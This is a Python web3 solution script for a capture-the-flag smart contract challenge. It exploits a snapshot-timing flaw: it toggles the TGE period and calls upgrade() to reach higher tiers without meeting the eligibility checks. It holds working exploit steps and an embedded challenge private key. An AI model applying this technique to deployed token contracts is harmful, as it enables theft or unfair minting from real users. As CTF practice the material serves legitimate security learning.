#!/usr/bin/env python3
"""
Solution for TGE Challenge

Exploit: The preTGESupply snapshot is taken once, but preTGEBalance continues 
to update during TGE periods. The upgrade() function mints before checking 
eligibility, allowing us to bypass the restriction.

Steps:
1. Approve TGE contract to spend tokens
2. Buy TIER_1 (costs 15 tokens)
3. Disable TGE to trigger snapshot (preTGESupply[1]=1, [2]=0, [3]=0)
4. Re-enable TGE period
5. Upgrade to TIER_2 (mints during TGE, so preTGEBalance[2]=1 > preTGESupply[2]=0)
6. Upgrade to TIER_3 (mints during TGE, so preTGEBalance[3]=1 > preTGESupply[3]=0)
"""

from web3 import Web3
from eth_account import Account

# Configuration
RPC_URL = "http://challenges.1pc.tf:38200/8f3faf30-0e3c-41af-9013-fb4c746cd1a3"
PRIVATE_KEY = "ba8b41395e41fab86bfac98537cc8e93a84f9387247219771e29220dde9a96d1"
SETUP_ADDR = "0xde3D09620104323b1e96b773b783fa8A4bdC481d"

# Connect to network
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)
player_address = account.address

print(f"[+] Connected to RPC: {RPC_URL}")
print(f"[+] Player address: {player_address}")
print(f"[+] Balance: {w3.eth.get_balance(player_address) / 10**18} ETH")

# ABIs
SETUP_ABI = [
    {"inputs": [], "name": "tge", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "token", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "_tge", "type": "bool"}], "name": "enableTge", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
]

TOKEN_ABI = [
    {"inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
]

TGE_ABI = [
    {"inputs": [], "name": "buy", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "tier", "type": "uint256"}], "name": "upgrade", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "", "type": "address"}], "name": "userTiers", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
]

# Get contract instances
setup = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
tge_address = setup.functions.tge().call()
token_address = setup.functions.token().call()

print(f"[+] TGE contract: {tge_address}")
print(f"[+] Token contract: {token_address}")

tge = w3.eth.contract(address=tge_address, abi=TGE_ABI)
token = w3.eth.contract(address=token_address, abi=TOKEN_ABI)

# Check initial state
token_balance = token.functions.balanceOf(player_address).call()
print(f"[+] Initial token balance: {token_balance}")

def send_tx(func, description):
    """Helper to send a transaction"""
    print(f"\n[*] {description}")
    tx = func.build_transaction({
        'from': player_address,
        'nonce': w3.eth.get_transaction_count(player_address),
        'gas': 500000,
        'gasPrice': w3.eth.gas_price,
    })
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"    Tx hash: {tx_hash.hex()}")
    print(f"    Status: {'Success' if receipt['status'] == 1 else 'Failed'}")
    return receipt

# Step 1: Approve TGE to spend tokens
print("\n" + "="*60)
print("STEP 1: Approve TGE contract to spend tokens")
print("="*60)
send_tx(token.functions.approve(tge_address, 15), "Approving 15 tokens for TGE")

# Step 2: Buy TIER_1
print("\n" + "="*60)
print("STEP 2: Buy TIER_1 NFT")
print("="*60)
send_tx(tge.functions.buy(), "Buying TIER_1")
user_tier = tge.functions.userTiers(player_address).call()
print(f"[+] Current tier: {user_tier}")

# Step 3: Disable TGE to trigger snapshot
print("\n" + "="*60)
print("STEP 3: Disable TGE (triggers snapshot)")
print("="*60)
send_tx(setup.functions.enableTge(False), "Disabling TGE period")

# Step 4: Re-enable TGE
print("\n" + "="*60)
print("STEP 4: Re-enable TGE period")
print("="*60)
send_tx(setup.functions.enableTge(True), "Re-enabling TGE period")

# Step 5: Upgrade to TIER_2
print("\n" + "="*60)
print("STEP 5: Upgrade to TIER_2")
print("="*60)
send_tx(tge.functions.upgrade(2), "Upgrading to TIER_2")
user_tier = tge.functions.userTiers(player_address).call()
print(f"[+] Current tier: {user_tier}")

# Step 6: Upgrade to TIER_3
print("\n" + "="*60)
print("STEP 6: Upgrade to TIER_3")
print("="*60)
send_tx(tge.functions.upgrade(3), "Upgrading to TIER_3")
user_tier = tge.functions.userTiers(player_address).call()
print(f"[+] Current tier: {user_tier}")

# Check if solved
print("\n" + "="*60)
print("VERIFICATION")
print("="*60)
try:
    is_solved = setup.functions.isSolved().call()
    print(f"[+] Challenge solved: {is_solved}")
    print("\n🎉 SUCCESS! Challenge completed!")
except Exception as e:
    print(f"[-] Challenge not solved: {e}")
